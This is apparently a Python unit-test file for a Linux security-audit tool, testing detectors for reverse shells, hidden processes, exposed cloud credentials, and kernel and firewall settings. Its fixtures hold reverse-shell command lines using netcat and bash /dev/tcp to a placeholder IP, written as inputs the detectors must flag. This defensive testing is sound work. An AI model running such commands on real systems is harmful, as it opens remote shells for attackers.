from __future__ import annotations

from unittest.mock import patch

from usaf.checks.cloud.cld_security_checks import (
    CloudAgentCheck,
    CloudCliToolsCheck,
    CloudEnvCredentialsCheck,
    CloudMetadataCheck,
    CloudStorageToolsCheck,
    KubeletSecurityCheck,
)
from usaf.checks.compromise.com_extended_checks import (
    AnomalousProcessNameCheck,
    HiddenProcessCheck,
    HighMemoryProcessesCheck,
    ReverseShellDetectionCheck,
    SuspiciousNetworkConnectionsCheck,
    UnusualOutboundConnectionsCheck,
)
from usaf.checks.kernel.krn_security_checks import (
    DebugFsCheck,
    KernelAslrCheck,
    KernelModuleBlacklistCheck,
    SysRqKeyCheck,
)
from usaf.models.severity import Confidence, Severity


class TestCom301SuspiciousConnections:
    def test_passes_with_clean(self):
        check = SuspiciousNetworkConnectionsCheck()
        collectors = {"processes": {"processes": [{"pid": 1, "name": "systemd", "cmdline": "/sbin/init"}]}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_has_mitre(self):
        check = SuspiciousNetworkConnectionsCheck()
        collectors = {"processes": {"processes": [{"pid": 100, "name": "nc", "cmdline": "nc -e 1.2.3.4 4444"}]}}
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestCom302ReverseShell:
    def test_passes_with_clean(self):
        check = ReverseShellDetectionCheck()
        collectors = {"processes": {"processes": [{"pid": 1, "name": "systemd", "cmdline": "/sbin/init"}]}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_fails_with_bash_dev_tcp(self):
        check = ReverseShellDetectionCheck()
        collectors = {"processes": {"processes": [{"pid": 999, "name": "bash", "cmdline": "bash -i >& /dev/tcp/1.2.3.4/8080"}]}}
        result = check.evaluate(collectors)
        assert not result.passed
        assert len(result.findings) == 1
        assert result.findings[0].severity == Severity.CRITICAL
        assert result.findings[0].confidence == Confidence.HIGH

    def test_has_mitre(self):
        check = ReverseShellDetectionCheck()
        collectors = {"processes": {"processes": [{"pid": 999, "name": "bash", "cmdline": "bash -i >& /dev/tcp/1.2.3.4/8080"}]}}
        result = check.evaluate(collectors)
        assert len(result.findings[0].mitre_attack_ids) > 0


class TestCom303UnusualOutbound:
    def test_has_mitre(self):
        check = UnusualOutboundConnectionsCheck()
        collectors = {
            "sockets": {"tcp": [{"remote_address": "1.2.3.4", "remote_port": 8888, "local_port": 12345, "pid": 500}], "tcp6": []},
            "processes": {"processes": [{"pid": 500, "name": "strange_binary"}]},
        }
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestCom304HighMemory:
    def test_passes_with_normal(self):
        check = HighMemoryProcessesCheck()
        collectors = {"processes": {"processes": [{"pid": 1, "name": "systemd", "memory_mbytes": 50}]}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_has_mitre(self):
        check = HighMemoryProcessesCheck()
        collectors = {"processes": {"processes": [{"pid": 999, "name": "xmr", "memory_mbytes": 2000}]}}
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestCom305HiddenProcess:
    def test_passes_with_normal(self):
        check = HiddenProcessCheck()
        collectors = {"processes": {"processes": [{"pid": 1, "name": "systemd", "binary": "/sbin/init"}]}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_fails_without_binary(self):
        check = HiddenProcessCheck()
        collectors = {"processes": {"processes": [{"pid": 999, "name": "evil", "binary": None}]}}
        result = check.evaluate(collectors)
        assert not result.passed
        assert len(result.findings) == 1
        assert result.findings[0].severity == Severity.CRITICAL

    def test_has_mitre(self):
        check = HiddenProcessCheck()
        collectors = {"processes": {"processes": [{"pid": 999, "name": "evil", "binary": None}]}}
        result = check.evaluate(collectors)
        assert len(result.findings[0].mitre_attack_ids) > 0


class TestCom306AnomalousNames:
    def test_has_mitre(self):
        check = AnomalousProcessNameCheck()
        collectors = {"processes": {"processes": [{"pid": 999, "name": "kworker", "binary": "/proc/self/exe"}]}}
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestCld601CloudCli:
    def test_passes_without_cli(self):
        check = CloudCliToolsCheck()
        collectors = {"apt": {"packages": [{"name": "coreutils"}]}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_fails_with_awscli(self):
        check = CloudCliToolsCheck()
        collectors = {"apt": {"packages": [{"name": "awscli"}]}}
        result = check.evaluate(collectors)
        assert not result.passed
        assert len(result.findings) == 1
        assert result.findings[0].severity == Severity.MEDIUM

    def test_has_mitre(self):
        check = CloudCliToolsCheck()
        collectors = {"apt": {"packages": [{"name": "awscli"}]}}
        result = check.evaluate(collectors)
        assert len(result.findings[0].mitre_attack_ids) > 0


class TestCld602EnvCreds:
    def test_passes_with_clean_env(self):
        check = CloudEnvCredentialsCheck()
        collectors = {"processes": {"processes": [{"pid": 1, "name": "systemd", "environment": "PATH=/usr/bin"}]}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_fails_with_aws_key(self):
        check = CloudEnvCredentialsCheck()
        collectors = {"processes": {"processes": [{"pid": 500, "name": "app", "environment": "AWS_ACCESS_KEY_ID=AKIA..."}]}}
        result = check.evaluate(collectors)
        assert not result.passed
        assert len(result.findings) == 1
        assert result.findings[0].severity == Severity.CRITICAL

    def test_has_mitre(self):
        check = CloudEnvCredentialsCheck()
        collectors = {"processes": {"processes": [{"pid": 500, "name": "app", "environment": "AWS_SECRET_ACCESS_KEY=abc"}]}}
        result = check.evaluate(collectors)
        assert len(result.findings[0].mitre_attack_ids) > 0


class TestCld603Metadata:
    def test_has_mitre(self):
        check = CloudMetadataCheck()
        collectors = {"cloud": {"on_cloud": True, "provider": "aws", "metadata_service": {"imds_reachable": True, "imds_v1_accessible": True}}}
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestCld604StorageTools:
    def test_has_mitre(self):
        check = CloudStorageToolsCheck()
        collectors = {"apt": {"packages": []}, "cloud": {"on_cloud": True, "storage_tools": {"s3cmd": True}}}
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestCld605Agent:
    def test_has_mitre(self):
        check = CloudAgentCheck()
        collectors = {"cloud": {"on_cloud": True, "provider": "aws", "agents": {}}}
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestCld606Kubelet:
    def test_has_mitre(self):
        check = KubeletSecurityCheck()
        collectors = {"cloud": {"kubernetes": {"detected": True, "kubelet_config_raw": {"authentication": {"anonymous": {"enabled": True}}}}}}
        result = check.evaluate(collectors)
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestKern901Aslr:
    def test_passes_with_aslr_2(self):
        check = KernelAslrCheck()
        collectors = {"kernel_params": {"kernel.randomize_va_space": "2"}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_fails_with_aslr_0(self):
        check = KernelAslrCheck()
        collectors = {"kernel_params": {"kernel.randomize_va_space": "0"}}
        result = check.evaluate(collectors)
        assert not result.passed
        assert len(result.findings) == 1

    def test_has_mitre(self):
        check = KernelAslrCheck()
        collectors = {"kernel_params": {"kernel.randomize_va_space": "0"}}
        result = check.evaluate(collectors)
        assert len(result.findings[0].mitre_attack_ids) > 0


class TestKern902DebugFs:
    def test_passes_without_debugfs(self):
        check = DebugFsCheck()
        collectors = {"mounts": {"mounts": [{"fstype": "ext4", "mount_point": "/"}]}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_fails_with_debugfs(self):
        check = DebugFsCheck()
        collectors = {"mounts": {"mounts": [{"fstype": "debugfs", "mount_point": "/sys/kernel/debug"}]}}
        result = check.evaluate(collectors)
        assert not result.passed
        assert len(result.findings) == 1
        assert result.findings[0].severity == Severity.MEDIUM

    def test_has_mitre(self):
        check = DebugFsCheck()
        collectors = {"mounts": {"mounts": [{"fstype": "debugfs", "mount_point": "/sys/kernel/debug"}]}}
        result = check.evaluate(collectors)
        assert len(result.findings[0].mitre_attack_ids) > 0


class TestKern903Blacklist:
    def test_has_mitre(self):
        check = KernelModuleBlacklistCheck()
        with patch("usaf.checks.kernel.krn_security_checks.Path.is_file", return_value=False):
            with patch("usaf.checks.kernel.krn_security_checks.Path.is_dir", return_value=False):
                result = check.evaluate({})
        if not result.passed:
            assert len(result.findings[0].mitre_attack_ids) > 0


class TestKern904SysRq:
    def test_passes_with_sysrq_0(self):
        check = SysRqKeyCheck()
        collectors = {"kernel_params": {"kernel.sysrq": "0"}}
        result = check.evaluate(collectors)
        assert result.passed

    def test_fails_with_sysrq_1(self):
        check = SysRqKeyCheck()
        collectors = {"kernel_params": {"kernel.sysrq": "1"}}
        result = check.evaluate(collectors)
        assert not result.passed
        assert len(result.findings) == 1
        assert result.findings[0].severity == Severity.LOW

    def test_has_mitre(self):
        check = SysRqKeyCheck()
        collectors = {"kernel_params": {"kernel.sysrq": "1"}}
        result = check.evaluate(collectors)
        assert len(result.findings[0].mitre_attack_ids) > 0


from usaf.checks.security.fw_boot_check import FirewallServiceBootCheck


class TestFw209FirewallBoot:
    def test_has_mitre(self):
        check = FirewallServiceBootCheck()
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.stdout = "disabled\n"
            mock_run.return_value.returncode = 1
            result = check.evaluate({})
            if not result.passed:
                assert len(result.findings[0].mitre_attack_ids) > 0

    def test_passes_with_ufw_enabled(self):
        check = FirewallServiceBootCheck()
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.stdout = "enabled\n"
            mock_run.return_value.returncode = 0
            result = check.evaluate({})
        assert result.passed
